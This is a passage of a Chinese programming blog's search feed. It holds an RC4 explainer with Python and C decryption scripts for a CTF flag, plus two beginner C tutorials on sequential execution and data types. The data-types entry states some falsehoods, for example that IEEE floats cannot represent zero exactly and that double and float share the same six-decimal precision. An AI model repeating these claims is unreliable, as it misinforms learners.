/>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RC4</title>
      <link href="/2023fb5e5b37b475/"/>
      <url>/2023fb5e5b37b475/</url>
      
        <content type="html"><![CDATA[<h1 id="rc4概述">RC4概述</h1><p>以下为维基百科的描述:</p><p>在<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a>中，<strong>RC4</strong>（来自Rivest Cipher 4的缩写）是一种<a href="https://zh.wikipedia.org/wiki/%E4%B8%B2%E6%B5%81%E5%8A%A0%E5%AF%86%E6%B3%95">串流加密法</a>，<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E9%92%A5">密钥</a>长度可变。它加解密使用相同的密钥，因此也属于<a href="https://zh.wikipedia.org/wiki/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86">对称加密算法</a>。RC4是<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A%A0%E5%AF%86">有线等效加密</a>（WEP）中采用的加密算法，也曾经是<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE">TLS</a>可采用的算法之一。</p><p>RC4是由美国密码学家<a href="https://zh.wikipedia.org/wiki/%E7%BD%97%E7%BA%B3%E5%BE%B7%C2%B7%E6%9D%8E%E7%BB%B4%E6%96%AF%E7%89%B9">罗纳德·李维斯特</a>（Ronald Rivest）在1987年设计的。由于RC4算法存在弱点，2015年2月所发布的 <a href="https://tools.ietf.org/html/rfc7465">RFC 7465</a> 规定禁止在TLS中使用RC4加密算法[<a href="https://zh.wikipedia.org/wiki/RC4#cite_note-1">1]</a>。</p><p>RC4由<a href="https://zh.wikipedia.org/wiki/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0">伪随机数</a>生成器和<a href="https://zh.wikipedia.org/wiki/%E5%BC%82%E6%88%96">异或</a>运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个<a href="https://zh.wikipedia.org/wiki/S%E7%9B%92">S盒</a>。S盒用来加密数据，而且在加密过程中S盒会变化。</p><p>由于<a href="https://zh.wikipedia.org/wiki/%E5%BC%82%E6%88%96">异或运算</a>的<a href="https://zh.wikipedia.org/wiki/%E5%B0%8D%E5%90%88">对合性</a>，RC4加密解密使用同一套算法。</p><h1 id="运算过程">运算过程</h1><p>原理很简单，包括初始化算法（KSA）和<a href="https://baike.baidu.com/item/%E4%BC%AA%E9%9A%8F%E6%9C%BA?fromModule=lemma_inlink">伪随机</a>子密码生成算法（PRGA)两大部分</p><p>由于是异或运算,加解密<code>同操作</code>—对明文使用同一个密钥异或两次最后得到的是原文</p><h1 id="解密脚本">解密脚本</h1><p>Python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;\0&#x27;</span>  <span class="comment"># enc 中保存密文</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsFlagggg&quot;</span>  <span class="comment"># 密钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成(搅乱) S-box --- KSA</span></span><br><span class="line">s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">    s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用S盒生成密钥流 --- The pseudo-random generation algorithm(PRGA)</span></span><br><span class="line"><span class="comment"># 同时直接进行解密</span></span><br><span class="line">i = j = <span class="number">0</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> enc:</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">    s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">    k = s_box[t]</span><br><span class="line">    res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(i, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>C:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RC4</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//交换函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">uint8_t</span> *a, <span class="type">uint8_t</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成的256长度的sbox</span></span><br><span class="line"><span class="type">uint8_t</span> sbox[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化s表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_sbox</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="type">int</span> tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        sbox[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    j = k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        tmp = sbox[i];</span><br><span class="line">        j = (j + tmp + key[k]) % <span class="number">256</span>;</span><br><span class="line">        sbox[i] = sbox[j];</span><br><span class="line">        sbox[j] = tmp;</span><br><span class="line">        <span class="keyword">if</span> (++k &gt;= <span class="built_in">strlen</span>((<span class="type">char</span> *) key))k = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4_decode</span><span class="params">(<span class="type">uint8_t</span> *dec, <span class="type">uint8_t</span> *enc, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//len为flag长度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        j = (j + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        k = (k + sbox[j]) % <span class="number">256</span>;</span><br><span class="line">        swap(sbox + j, sbox + k);</span><br><span class="line">        dec[i] = enc[i] ^ (sbox[((<span class="type">int</span>) sbox[j] + sbox[k]) % <span class="number">256</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//    scanf(&quot;%s&quot;,s3);</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">uint8_t</span> dec[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//需要解密的字节串</span></span><br><span class="line">    <span class="type">uint8_t</span> enc[] = &#123;</span><br><span class="line">            <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="number">181</span>, <span class="string">&#x27;*&#x27;</span>, <span class="number">225</span>, <span class="string">&#x27;:&#x27;</span>, <span class="number">244</span>, <span class="number">147</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="number">182</span>, <span class="string">&#x27;J&#x27;</span>, <span class="number">250</span>, <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">            <span class="number">25</span>, <span class="number">135</span>, <span class="number">4</span>, <span class="number">188</span>, <span class="string">&#x27;-&#x27;</span>, <span class="number">230</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="number">22</span>, <span class="number">220</span>, <span class="number">25</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;55667788&quot;</span>;</span><br><span class="line">    init_sbox((<span class="type">unsigned</span> <span class="type">char</span> *) key);</span><br><span class="line">    len = <span class="keyword">sizeof</span>(enc) / <span class="keyword">sizeof</span>(enc[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        enc[i] -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    RC4_decode(dec, enc, len);</span><br><span class="line">    <span class="comment">// printf(&quot;\n&quot;);</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, dec[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-5-顺序执行</title>
      <link href="/202322bfbdadd502/"/>
      <url>/202322bfbdadd502/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是顺序执行">什么是顺序执行</h1><p>顺序执行很简单,就是一步一步的向下运行,不管你写了什么代码,永远都是从开始的地方自上而下一步一步的执行到结束,除非中途有执行顺序改变的代码(选择语句,循环语句,goto跳转等)</p><p>任何语言都有这3种执行顺序的支持(不同程度上),C语言也不例外,而对于顺序执行,没有任何特殊的辅助标识来提示,单纯的<code>向下</code>依次运行即可(显然,正常人都不会认为程序默认会从下向上执行).</p><p>例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这是第一条语句\n&quot;</span>); <span class="comment">// printf用来输出一个字符串,这里只需要知道用来输出即可</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这是第二条语句\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这是第三条语句\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这是第四条语句\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果很显而易见:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230922191707205.png" alt="image-20230922191707205" style="zoom:33%;" /><p>另一个算数的例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, num); <span class="comment">//同样,只需要知道是用来输出num的值即可</span></span><br><span class="line">num = num + <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, num);</span><br><span class="line">num = num + <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, num);</span><br><span class="line">num = num + <span class="number">3</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, num);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230922192123052.png" alt="image-20230922192123052" style="zoom:33%;" /><p>实际上顺序执行几乎完全不需要考虑任何问题,你只需要按照你的想法去考虑这个程序一步步地要依次做什么事情,然后去一行行的写代码即可.</p><p align=right>---WAHAHA,2023.9.22</p><br><br><p>上一篇:<a href="../20237bb78790d38b/">c语言教程-4-表达式和语句</a></p><p>下一篇:<a href="../20237a3f77e5bcf7/">c语言教程-6-选择执行</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-3_1-数据类型</title>
      <link href="/2023949602bbfb8e/"/>
      <url>/2023949602bbfb8e/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么要有数据类型">为什么要有数据类型</h1><p>​如果你能想到这个问题,那么恭喜你意识到了低级语言和高级语言的区别.机器语言自然不必多说,到了汇编语言,仍然没有发展出数据类型这个概念–一切都是按照二进制串逐字节进行处理的.也就是说,在汇编语言的角度,无论这个数据是什么(无论是小数,整数,还是字符串),统统视为二进制串,程序员需要自己去识别考虑自己现在正在处理什么数据,去编写对应的处理代码.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">; 8086汇编</span><br><span class="line">; 定义两个数据段,我们只能将其视为一个个的字节(或字)去进行处理,没有其他的类型可以识别,</span><br><span class="line">; 各个数据段的意义及操作全凭程序员自己处理</span><br><span class="line">assume cs:code</span><br><span class="line">data1 segment</span><br><span class="line">    db 1,2,3,4,5           </span><br><span class="line">data1 ends</span><br><span class="line">data2 segment</span><br><span class="line">    db 6,7,8,9,10</span><br><span class="line">data2 ends</span><br></pre></td></tr></table></figure><p>​很容易就能想到这样的开发方式的困难与繁琐.那么随后出现的高级语言,不仅在语法上接近自然语言,在对数据存储的角度,也考虑的十分周到,C语言中出现了(并不是第一个)基本数据类型,用以识别不同类型的数据,从而在底层进行不同的处理—例如浮点数和整数的底层存储原理完全不同,但是它们都共享同一个加法运算符<code>+</code>进行加法运算.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 整数和浮点数都直接使用+运算符</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> integerNum = <span class="number">5</span>,integerNum2 = <span class="number">6</span>;</span><br><span class="line">    <span class="type">float</span> floatNum = <span class="number">2.5</span>,floatNum2 = <span class="number">3.5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i_result = integerNum + integerNum2;</span><br><span class="line"><span class="type">float</span> f_result =  floatNum + floatNum2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;整数和:%d\n&quot;</span>, i_result);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;浮点数和:%f\n&quot;</span>, f_result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​也就是说,数据类型方便了我们在编程的时候进行不同数据的区分,而且编译器也能根据数据类型的不同从而进行一定程度的代码检查,从而避免错误的数据处理—然而这种检查是有限的,因为C语言相对还是比较宽松的,一些隐式转换(后面介绍,例如将int类型的值自动提升为float单精度浮点型)C语言是默认允许的.</p><p>​C语言给了C开发者最大限度的自由度,C语言认为避免这些潜在的错误是程序员的事情,而不是为了安全进行限制.越学到后面,尤其是学习了其他高级语言,就越能体会到C语言那极高的自由度,同时,这也给C程序带来了不小的安全问题,例如安全竞赛的PWN方向的很多部分的关键都是利用了C函数的栈溢出漏洞进行攻击.所以,在编写C程序的时候,更应该比其他语言编写者加倍小心,因为C编译器可能并不会给你足够多的报错信息让你进行纠正—同样,越是学的多,越能体会得到这个问题.</p><h1 id="c语言支持的数据类型">C语言支持的数据类型</h1><p>C语言支持的数据类型有如下几种:</p><p>​<code>4种数据类型----整型(整数),浮点型(小数),字符型(字符),特殊(数组,结构体,指针,枚举,联合)</code></p><p>不同的数据类型用来存储不同类型的值,并且彼此之间可以进行一定程度上的转换.</p><h2 id="整型">整型</h2><p>作为数据类型,都有不同的存储范围</p><p>​我们知道有1字节=8位(二进制位)</p><p>​整型的各种数据范围都是2的幂次方,根据编写的程序所要处理的问题规模的不同,我们可以选择合适的类型.</p><p>那么对于整型的所有可选的类型有:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">short</span> 短整型 <span class="number">2</span>字节/<span class="number">16</span>位 <span class="number">-2</span>^<span class="number">15</span>~<span class="number">2</span>^<span class="number">15</span><span class="number">-1</span></span><br><span class="line"><span class="type">signed</span> <span class="type">int</span> 整型 <span class="number">4</span>字节/<span class="number">32</span>位 <span class="number">-2</span>^<span class="number">31</span>~<span class="number">2</span>^<span class="number">31</span><span class="number">-1</span> </span><br><span class="line"><span class="type">signed</span> <span class="type">long</span> 长整型 <span class="number">4</span>字节/<span class="number">32</span>位</span><br><span class="line"><span class="type">signed</span> <span class="type">long</span> <span class="type">long</span> 超长整型 <span class="number">8</span>字节/<span class="number">64</span>位</span><br></pre></td></tr></table></figure><p>上面的所有的类型前面都有一个signed关键字,代表这个类型是有符号的(正负号),这个关键字是默认的,也就是说可以忽略,默认创建的变量都是有符号的.</p><p>那么同理,对应就有一系列无符号类型(只要把signed替换为unsigned),例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> 无符号超长整型 <span class="number">8</span>字节 大小比<span class="type">long</span> <span class="type">long</span> 翻了一倍</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>;(如果程序只需要考虑正数)</span><br></pre></td></tr></table></figure><p>接下来讨论的<strong>数据范围</strong>的事情就要涉及到一点底层的知识了(其实没多少,需要自己去看补码的知识—见<code>CSAPP(《深入理解计算机系统》)</code>):</p><p>我们知道对于同样的一字节有:</p><p><strong>只表示正数</strong></p><p>1字节—8个bit位—最多能唯一表示0~255(正数)这些数<br>00000000 原码<br>0/1 两种状态的全部组合有 2^8=256种状态</p><p><strong>同时表示正负数</strong></p><p>首先来看一个问题:</p><p>​我们有1字节,想要最大限度的存储整数—带一个符号signed位+剩下7位有效数字,那么对于0这个数有:</p><p>​0 0000000 +0</p><p>​1 0000000 -0</p><p>​可以发现,如果我们仅仅简单的将各个数的二进制表示来存储的话,那么就会遇到这个问题,即00000000和10000000这两个编码都表示0,且一个是+0,一个是-0,显然从数学上是完全相等的,但是问题就在于,在计算机中,一个数的编码必须是唯一的,那么我们必须要解决这个正负零的问题,解决的方法就是将10000000解释为其他数,我们引入补码这种表示方法,将10000000解释为-128:</p><p>​0 0000000 +0<br>​1 0000000 -128 计算机补码</p><p>我们将256中状态分成几部分:<br>256=128(负数)+127(正数)+1(原点0)<br>也就是说我们实际上能够存储的整数范围就是-128~127</p><p>其实就是 128=2^7—8位数实际上只有7位用来存储真正的数</p><p>同理16位—15位有数<br>0 0000000 00000000 -2^15~2^15-1</p><p>那么可以推出对于k位有符号数,其存储范围是-2^(k-1)~2^(k-1)-1</p><p><code>注:这里只讨论了数据范围,暂时没有讨论补码的问题,感兴趣可以去看CSAPP中的相关章节,或者觉得看不懂百度也行,具体(预计)会在位运算进行讨论</code></p><h2 id="浮点数">浮点数</h2><p>无法精确存储!!!无法精确存储!!!无法精确存储!!!重要的事情说3遍!!!</p><p>浮点数的存储比整数要复杂的多,这并不是C语言的特性,而是计算机对浮点数的存储方式与整数完全不同.现在的浮点数存储已经标准化,都遵循IEEE的标准(具体内容可以自行查询).</p><p>那么由于浮点数存储方式的特殊性(基于科学计数法),导致其虽然总体范围较大,但是却无法精确表示.</p><p><strong>重要的关键点</strong>:C语言中的浮点数(或者说IEEE标准的浮点数)无法精确表示0,无法精确表示无限小数,但可以表示无穷大和NaN(not a number)</p><p>C语言的浮点数主要有两种:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> 双精度浮点型 <span class="number">8</span>字节/<span class="number">64</span>位 精度<span class="number">16</span> 最多小数点后<span class="number">6</span>位</span><br><span class="line"><span class="type">float</span> 单精度浮点型 <span class="number">4</span>字节/<span class="number">32</span>位 精度<span class="number">8</span> 最多小数点后<span class="number">6</span>位</span><br></pre></td></tr></table></figure><p>还有一种用的很少的<code>long double</code>,在现在的机器中精度更高,但是过去是用于解决兼容性问题引入的</p><p>讨论到浮点数,这里举一个例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> num2 = <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span>; <span class="comment">// num2是一个double类型的变量,并将三个0.1相加的值赋值给它</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.17f&quot;</span>,num2); <span class="comment">// 输出num2的值,并保留17位小数</span></span><br><span class="line"><span class="comment">// 输出 0.30000000000000004</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出实际上浮点数是无法精确存储的,但是越接近0,分布越密集,也就越精确</p><p>ps:笔者对浮点数的了解也比较有限,正在学习中,目前还没有特别深刻的认识(学习漏洞之一,但是实际编程确实会认真考虑到相关问题)</p><h2 id="字符型">字符型</h2><p>字符只有2种:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="type">signed</span>)<span class="type">char</span> 注意:极个别编译器默认为<span class="type">unsigned</span> <span class="type">char</span> 字符类型 <span class="number">1</span>字节 实际上就类似是一个<span class="number">1</span>字节的<span class="type">int</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span></span><br></pre></td></tr></table></figure><p>字符实际上存的是字符的ASCII码值(正整数)— -128~127<br>-128------------0-------------127(环—溢出问题)<br>char可以用于算术运算—因为实际上就是个数字</p><h3 id="ascii码">ASCII码</h3><p>机器只认识二进制数据,并不认识一个个给我们看的字符,这意味着我们需要把各种字符对应地转换为一个数字.</p><p><code>ASCII码</code>就是最常用的,针对拉丁字符(英文字符)的编码,一共有128个,即2^7个二进制位就能完全表示.</p><p>char变量存储一个字符,也就是存储其对应的ASCII码,由于一个char变量占用1个字节,有8个二进制位,所以足以存储一个码值,同时需要注意的是,由于2^8=256,所以最高位不会被使用,这意味着我们可能将其正常用于符号位.</p><p>事实上,一般情况下,<code>char</code>类型实际上等价于<code>signed char</code>类型.</p><p>ASCII码表请百度查找.</p><h3 id="如何存储一个字符">如何存储一个字符</h3><p>char实际上存储的是字符的ASCII码,这也是他可以参与整数运算的原因.</p><p>但是,我们仍然可以直观地将一个字符赋值给char变量.</p><p>C语言中,单个的字符需要用一对<code>''</code>来包括起来,他们是一个整体,例如字符A在C语言中表示为<code>'A'</code>.</p><p>也就是说,我们简单地将字符加上一对<code>''</code>即可将其赋值给一个char变量:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 也就是说,我们简单地将字符加上一对`&#x27;&#x27;`即可将其赋值给一个char变量:</span></span><br><span class="line">    <span class="type">char</span> c = <span class="string">&#x27;a&#x27;</span>;<span class="comment">// c中存储的是字符&#x27;a&#x27;的ASCII码,即97(十进制)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, c); <span class="comment">// 输出 a ,并没有输出97和字符两边的单引号</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中,printf中使用<code>%c</code>来输出一个字符,如果我们仍然使用<code>%d</code>,即输出整数的方式来输出一个字符,那么会输出其ASCII码:</p><figure class="highlight 